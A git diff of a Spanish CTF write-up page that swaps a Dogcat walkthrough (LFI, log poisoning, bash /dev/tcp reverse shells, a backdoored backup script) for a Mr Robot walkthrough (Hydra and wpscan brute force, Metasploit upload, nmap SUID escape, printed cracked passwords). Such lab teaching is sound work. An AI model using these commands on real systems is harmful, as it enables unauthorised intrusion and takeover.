@@ -146,34 +146,6 @@
                     <img src="../MrRobot1/img/foto5.png" alt="foto" class="writeup-image">
                     <p class="image-caption">Figura 5: Directorios interesantes</p>
                 </div>
-
-                <h3>Exfiltrar datos a través de un wrapper PHP</h3>
-
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>php://filter/convert.base64-encode/resource=dog/var/www/html/index.php</code>
-                </div>
-
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>El wrapper php://filter permite leer el contenido de un archivo y, en este caso, 
-                    convertirlo a una codificación Base64 para facilitar su visualización y evitar problemas de caracteres especiales.
-                    </h4>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../Dogcat/img/foto4.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 4: Uso del wrapper php://filter</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Se aprecia que la aplicación añade automáticamente la extensión “.php” 
-                        al valor pasado en el parámetro, lo cual indica un posible vector de vulnerabilidad 
-                        en el manejo de la inclusión de archivos
-                    </p>
-                </div>
                 
             </div>
         </section>
@@ -183,59 +155,68 @@
             <h2><i class="fas fa-bug"></i>Explotación</h2>
             
             <div class="exploit-step">
-                <h3>Trabajar con el parámetro &ext=</h3>
+                
+                <h3>Flag (1 - 3)</h3>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>El parámetro &ext= evita que se añada automáticamente “.php” al archivo que se quiere incluir. Sin él, al usar un wrapper (como php://filter), se agregaría “.php” y fallaría la inclusión. Con &ext= puedes dejar la extensión vacía y que el wrapper funcione correctamente.
+                    <p>Por ejemplo podemos visitar el archivo robots.txt para ver que es 
+                        un archivo de texto plano que contiene una serie de palabras que 
+                        nos indican a los bots que deben ignorar nuestro sitio web.
                     </p>
                 </div>
                 
                 <div class="command-box">
                     <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd&ext=</code>
+                    <code>http://10.0.2.6/robots.txt</code>
                 </div>
                 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto5.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 5: Uso del parámetro ext=</p>
+                    <img src="../MrRobot1/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Acceso a http://10.0.2.6/robots.txt</p>
                 </div>
                 
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Ahora decodificamos este texto que está en base 64: https://www.base64decode.org/ </h4>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.0.2.6/key-1-of-3.txt</code>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto6.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 6: Lista de usuarios del sistema</p>
+                    <img src="../MrRobot1/img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: Acceso a http://10.0.2.6/key-1-of-3.txt</p>
                 </div>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>Ahora probaremos a analizar el log del sistema </p>
+                    <p>El otro archivo que encontramos es fsociety.dic que se trata de un diccionario con 858,160 palabras, lo vamos a guardar</p>
                 </div>
 
                 <div class="command-box">
                     <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>/?view=dog/../../../../../var/log/apache2/access.log&ext=</code>
+                    <code>curl http://10.0.2.6/fsocity.dic > fsocity.dic</code>
                 </div>
                 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto7.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 7: Log del sistema</p>
+                    <img src="../MrRobot1/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Descarga del fichero fsocity.dic</p>
                 </div>
 
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Lo importante aquí es que podemos visualizar los logs del sistema, lo que hace a la máquina susceptible de un log poisoning.
-                    </h4>
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Fichero fsocity.dic ya descargado</p>
                 </div>
+
+                <h3>Login Wordpress</h3>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>Inyectamos código PHP en el user agent para modificar el index y añadir un parámetro que, al incluirse, permite ejecutar código en el servidor.
+                    <p>En el panel de login Wordpress encontramos algo útil para probar: 
+                        Nos permite verificar si el usuario es correcto independientemente 
+                        de la contraseña
                     </p>
                 </div>
 
@@ -247,95 +228,319 @@
                 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto8.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 8: Uso del parámetro User-Agent</p>
-                </div>
-
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Si le pasamos el parámetro cmd por URL: (Para ver el ID del usuario veremos que devuelve www-data)</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>/?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=id</code>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../Dogcat/img/foto9.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 9: Comprobación del log para ver el ID del usuario (www-data)</p>
-                </div>
-
-                <h3>Reverse Shell</h3>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Usaremos una sentencia típica de bash (Revisar IP de nuestro Kali)</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>bash -c 'bash -i >& /dev/tcp/10.23.73.4/4444 0>&1'</code>
-                </div>
-
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Lo codificamos en formato URL: https://www.urlencoder.org/</h4>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.23.73.4%2F4444%200%3E%261%27</code>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../Dogcat/img/foto10.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 10: Insertamos la sentencia de la Shell reversa en la petición de BurpSuite</p>
-                </div>
-
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Antes de mandar la petición abrimos un servidor con netcat</h4>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>nc -lvnp 4444</code>
+                    <img src="../MrRobot1/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Acceso al loggin de Wordpress</p>
                 </div>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>Si enviamos la petición de la Reverse Shell (Burp Suite) veremos que obtenemos acceso</p>
+                    <p>Sabiendo esto podemos usar el diccionario que hemos encontrado para intentar lograr acceso a la máquina.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>hydra -L ./fsocity.dic -p 1234 10.0.2.6 http-form-post "/wp-login.php: log=^USER^&pwd=^PASS^:Invalid"”</code>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto11.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 11: Conexión establecida</p>
+                    <img src="../MrRobot1/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: Ataque de fuerza bruta con Hydra</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Veremos dos usuários válidos:</h4>
+                    <ul class="findings-list">
+                        <li>Elliot : 1234</li>
+                        <li>elliot : 1234</li>
+                    </ul>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Encontramos varios usuarios, ahora podemos hacer lo mismo para la contraseña 
+                    ya que si probamos estos usuarios veremos que el mensaje cambia.</p>
+                </div>
+
+                                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto12.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 12: Acceso al login de Wordpress</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Para hacer fuerza bruta sobre el login vamos a usar una herramienta diseñada 
+                    concretamente para Worpress llamada wpscan ya que hydra nos podría dar falsos positivos.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>wpscan --url http://10.0.2.6 --usernames Elliot --passwords ./fsocity.dic</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="..//MrRobot1/img/foto13.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 13: Uso de la herramienta WPScan</p>
                 </div>
 
                 <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Como la máquina no tiene python para estabilizar un poco la shell ejecutamos:</h4>
+                    <h4><i class="fas fa-exclamation-triangle"></i>Si falla actualizar dependencias y luego volver a ejecutar wpscan : <br><br>
+                        sudo apt update --system<br>
+                        sudo apt  install bundler<br>
+                        cd /usr/share/wpscan<br>
+                        sudo bundle install<br><br>
+                        o también probar con esto y luego volver a ejecutar wpscan:<br><br> 
+                        gem install wpscan<br>
+                        </h4>
                 </div>
 
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>script /dev/null -c bash</code>
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Una vez finalizado el ataque veremos una combinación de credenciales válidas</p>
                 </div>
 
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>export TERM=xterm</code>
+                <div class="discovery-box">
+                    <h4>Una vez finalizado el ataque veremos una combinación de credenciales válidas:</h4>
+                    <ul class="findings-list">
+                        <li>Username : Elliot</li>
+                        <li>Password : ER28-0652</li>
+                    </ul>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto12.png" alt="foto" class="writeup-image">
-                    <p class="image-caption">Figura 12: Reverse Shell estabilizada</p>
+                    <img src="../MrRobot1/img/foto14.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 14: Resultado del escaneo con WPScan</p>
                 </div>
 
-            </div>
+                <h3>Shell Reversa</h3>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Una vez dentro encontramos que somos administradores de Wordpress.</h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto15.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 15: Acceso como administrador al panel de Wordpress</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto16.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 16: Podremos consultar por ejemplo los Pluigins instalados en la web</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora podemos aprovechar el administrador de WordPress para obtener un shell en el servidor web. Para esto, utilizaremos Metasploit.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>msfconsole</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto17.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 17: Acceder a la herramienta Metasploit</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>use exploit/unix/webapp/wp_admin_shell_upload</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto18.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 18: Elegir el script apropiado de Metasploit</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>set RHOST 10.0.2.6</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto19.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 19: Elegir la IP objetivo del ataque</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>set USERNAME Elliot</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto20.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 20: Elegir el usuario objetivo del ataque</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>set PASSWORD ER28-0652</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto21.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 21: Elegir la contraseña objetivo del ataque</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>set wpcheck false</code>
+                </div>
+
+                <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i> Este comando desactiva la verificación automática de si un sitio usa WordPress</h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto22.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 22: Elegir la contraseña objetivo del ataque</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>exploit</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto23.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 23: Ejecución del exploit</p>
+                </div>
+
+                <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Veremos que ya tenemos una Shell interactiva con la maquina víctima</h4>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Si ahora vamos al escritorio del usuario en  /home /robot, 
+                    contiene la segunda key y un hash md5. La key no tenemos permiso 
+                    para leerla pero el hash si por lo que simplemente vamos a crackearlo.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /home/robot</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto24.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 24: Acceso a /home/robot</p>
+                </div>
+
+                <h3>Flag (2 - 3)</h3>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>No tenemos permisos para leerla</h4>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat key-2-of-3.txt</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat password.raw-md5</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto25.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 25: Acceso a /home/robot</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Credenciales obtenidas:</h4>
+                    <ul class="findings-list">
+                        <li>Username : robot</li>
+                        <li>Password : c3fcd3d76192e4007dfb496cca67e13b</li>
+                    </ul>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Copiamos el hash tal cual y lo vamos a crackear con la web : https://crackstation.net/ </h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto26.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 26: Acceso a /home/robot</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Resultado: </h4>
+                    <ul class="findings-list">
+                        <li>Password : abcdefghijklmnopqrstuvwxyz</li>
+                    </ul>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Utilicemos nuestra shell de meterpreter para generar una shell bash con Python</h4>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Una vez que tengamos nuestra shell bash, podemos iniciar sesión como robot para elevar nuestros privilegios</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>shell</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto27.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 27: Establecer una shell desde Meterpreter</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>su robot</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>abcdefghijklmnopqrstuvwxyz</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto28.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 28: Establecernos como usuario robot</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat key-2-of-3.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../MrRobot1/img/foto29.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 29: Flag 2- 3</p>
+                </div>
+
+            </div> 
         </section>
 
         <!-- Sección de Escalada de Privilegios -->
@@ -344,24 +549,43 @@
 
             <div class="discovery-box-standard">
                 <h4></h4>
-                <p>Si recordamos en el sistema no hay usuarios creados.<br><br>
-                    Por ello debemos istar sólo los usuarios con UID ≥ 1000 (usuarios reales, no del sistema)
-                    </p>
+                <p>Este usuario no tiene privilegios para realizar 
+                    ninguna acción como sudo en principio por lo que 
+                    el comando sudo -l nos muestra que no tiene ninguna opción.
+                </p>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd</code>
+                <code>sudo -l</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>abcdefghijklmnopqrstuvwxyz</code>
             </div>
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="../Dogcat/img/foto13.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 13: Listado de usuarios reales, no del sistema</p>
+                <img src="../MrRobot1/img/foto30.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 30: Ejecución de sudo -l</p>
+            </div>
+
+            <h3>Busqueda de un binario tenga el SUID activo</h3>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>find / -perm -4000 -type f 2>/dev/null</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../MrRobot1/img/foto31.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 31: Busqueda de un binario tenga el SUID activo</p>
             </div>
 
             <div class="discovery-box warning">
-                <h4><i class="fas fa-exclamation-triangle"></i>Sale vacío, aí que probaremos directamente a intentar escalar privilegios a root</h4>
+                <h4><i class="fas fa-exclamation-triangle"></i>Podemos ver que uno de ellos es nmap concretamente la versión 3.81.</h4>
             </div>
 
             <div class="discovery-box-standard">
@@ -371,183 +595,56 @@
             
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>sudo -l</code>
+                <code>nmap --version</code>
             </div>
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="../Dogcat/img/foto14.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 14: Resultado de sudo -l</p>
+                <img src="../MrRobot1/img/foto32.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 32: Nmap versión 3.81</p>
             </div>
+
+            <h3>Flag (3 - 3)</h3>
 
             <div class="discovery-box-standard">
                 <h4></h4>
-                <p>Veremos que tenemos privilegios sobre /usr/bin/env</p>
-            </div>
-
-            <h3>Utilidad  env</h3>
-
-            <div class="discovery-box">
-                <h4>env es una utilidad estándar en Unix que:</h4>
-                <ul class="findings-list">
-                    <li>Ejecuta un programa en un entorno modificado.</li>
-                    <li>Se suele usar para lanzar scripts con el intérprete correcto.</li>
-                </ul>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>En este caso la escalada es bastante sencilla ya que podemos ejecutar el comando env con el parámetro bash y obtener un shell.
-                </p>
+                <p>Entre las posibles vulnerabilidades relacionadas encontramos que estas
+                versiones de Nmap contaban con un modo interactivo que nos permite interactuar con la máquina.</p>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>sudo /usr/bin/env /bin/bash</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="../Dogcat/img/foto15.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 15: uso de sudo /usr/bin/env /bin/bash</p>
-            </div>
-
-            <h3>Flag (1 - 4)</h3>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Las tres primeras flags las tenemos aquí:</p>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto16.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 16: Flag (1 - 4)</p>
-            </div>
-
-            <h3>Flag (2 - 4)</h3>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto17.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 17: Flag (2 - 4)</p>
-            </div>
-
-            <h3>Flag (3 - 4)</h3>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto18.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 18: Flag (3 - 4)</p>
-            </div>
-
-            <h3>Flag (4 - 4)</h3>
-
-            <div class="discovery-box warning">
-                <h4><i class="fas fa-exclamation-triangle"></i>La última flag es algo “compleja”</h4>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Si nos fijamos (además de que lo dice en el reto) el id del host donde somos root es un string id similar a 
-                los que genera Docker. Por lo que estamos en un entorno de Docker</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Para escapar podemos navegar a /opt/backups.
-                </p>
+                <code>nmap --interactive</code>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>cd /opt/backups</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto19.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 19: Navegamos a /opt/backups</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Encontramos un script que hace un backup completo del contenedor por lo que debe estar siendo ejecutado por el usuario root</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Debemos modificar el script de backup (Revisar IP de nuestro Kali)</p>
+                <code>!sh</code>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>echo 'bash -i >& /dev/tcp/10.23.73.4/9999 0>&1' >> backup.sh</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto20.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 20: insertamos la llamada a la Reverse Shell</p>
-            </div>
-
-            <div class="discovery-box warning">
-                <h4><i class="fas fa-exclamation-triangle"></i>Antes de ejecutar eso debemos abrirnos un servidor a la escucha con netcat</h4>
+                <code>whoami</code>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>nc -lvnp 9999</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto21.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 21: Servidor a la escucha en el puerto 9999</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Si ejecutamos el script, podremos ver que aunque ponga que la conexión ha sido rechazada se conectará exitosamente</p>
+                <code>cd /root</code>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>./backup.sh</code>
+                <code>cat key-3-of-3.txt</code>
             </div>
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="..//Dogcat/img/foto22.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 22: Ejecución del script backup.sh</p>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto23.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 23: Conexión establecida en el puerto 9999</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Listamos los archivos y veremos que efectivamante está a nuestro alcance la flag 4</p>
-            </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>ls</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="..//Dogcat/img/foto24.png" alt="foto" class="writeup-image">
-                <p class="image-caption">Figura 24: Flag (4 - 4)</p>
+                <img src="../MrRobot1/img/foto33.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 33: Flag 3 - 3</p>
             </div>
 
         </section>
     </div>
-
-    
 
     <script src="../assets/scripts/copy.js" defer></script>
 </body>
